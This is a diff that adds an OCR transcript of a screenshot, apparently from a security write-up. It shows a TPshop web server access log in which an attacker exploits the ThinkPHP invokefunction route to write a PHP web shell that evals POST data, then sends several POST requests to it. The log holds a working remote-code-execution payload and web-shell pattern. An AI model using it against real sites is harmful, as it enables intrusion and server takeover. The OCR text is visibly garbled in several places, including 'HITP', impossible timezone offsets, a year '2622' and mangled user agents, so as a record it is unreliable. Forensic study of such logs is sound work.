@@ -1,0 +1,20 @@
+# OCR: 4be66e79cd52b9c9d4a240889a834abe.webp
+# 来源: .\02-WriteUp\2025\4be66e79cd52b9c9d4a240889a834abe.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:27
+
+[root@localhost appltcatton]# cat /www/wwwlogs/ww_tpshop.com.log |grep peiqi-php
+222.2.2.2 - - [04/Mar/2022:15:15:13 +6800] "GET /2s=/admin/\xSCthink\xSCapp/tnvokefunct
+ion&function=call_user_func_array&vars[@]=file_put_contents&vars[1][]=9e\9..php&vars[1]
+[]=<2php%20@eval ($_POST[%27peiqi%27])?> HITP/1.1" 200 12 "-" “ava/il 6 .13
+222.2.2.2 - - [04/Mar/2622:15:15:13 +8800] "GET /peigi.php HITP/1.1" 200 5 “
+0.13"
+222.2.2.2 - - [04/Mar/2022:15:16:25 +8800] "POST /peigi.php HITP/1-
+a/12_0(Windows NT 5.2;U;en)Presto/22.9.168 Verston/12.00"
+222.2.2.2 - - [04/Mar/2022:15-16:38 +0800] "POST /peiqi.php HITP/1.1" 200 154 “
+Ua/5.8 (Windows NT 6.4; WOH64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225
+. Safari/537.36"
+222.2.2.2 - - [04/Mar/2022:15-16:38 +0800] "POST /peiqi.php HITP/1.1" 200 575
+Lla/56 (Windows NT 6.1; Win64; x64; rv-25.0) Gecko/20100101 Firefox/25."
+222.2.2.2 - - [04/Mar/2022:15-16:39 +8800] "POST /peigi.php HITP/1.1" 200 113 “
+Lla/5-0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3"
